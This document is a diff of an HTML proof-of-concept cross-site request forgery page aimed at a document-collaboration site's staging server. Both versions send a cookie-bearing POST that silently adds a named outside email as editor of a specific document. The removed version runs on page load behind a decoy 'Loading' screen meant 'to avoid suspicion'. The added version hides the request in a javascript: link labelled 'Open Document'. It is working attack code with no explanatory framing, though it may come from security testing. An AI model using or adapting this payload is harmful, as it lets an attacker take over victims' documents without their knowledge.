@@ -1,43 +1,21 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <script>
-    // Execute immediately on page load
-    (function() {
-        // Show loading message to avoid suspicion
-        document.body.innerHTML = `
-            <div style="padding: 50px; text-align: center; font-family: Arial;">
-                <h2>🔄 Loading Document Collaboration Tool...</h2>
-                <p>Please wait while we configure your workspace.</p>
-            </div>
-        `;
-        
-        // ATTACK: Add attacker as editor
+    <a href="javascript:(function(){
+        // Silent CSRF execution
         fetch('https://staging.textjam.com/api/doc/KAM7CN17/access/collaborator/editor', {
             method: 'POST',
-            credentials: 'include',  // Critical: sends user's cookies
-            mode: 'no-cors',         // Bypasses CORS restrictions
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                email: 'rathnaitsergey692@gmail.com'  // Attacker's email
-            })
-        })
-        .then(() => {
-            // Success - redirect to legitimate page
-            setTimeout(() => {
-                window.location.href = 'https://staging.textjam.com/doc/KAM7CN17?message=Workspace+configured';
-            }, 1500);
-        })
-        .catch(error => {
-            // Error - still redirect but log error
-            console.error('CSRF Attack Failed:', error);
-            setTimeout(() => {
-                window.location.href = 'https://staging.textjam.com';
-            }, 1500);
+            credentials: 'include',
+            mode: 'no-cors',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({email: 'rathnaitsergey692@gmail.com'})
         });
-    })();
-    </script>
+        
+        // Redirect immediately
+        window.location.href = 'https://staging.textjam.com/doc/KAM7CN17';
+    })()" 
+    style="color: blue; text-decoration: underline;">
+    Open Document KAM7CN17
+    </a>
 </body>
 </html>
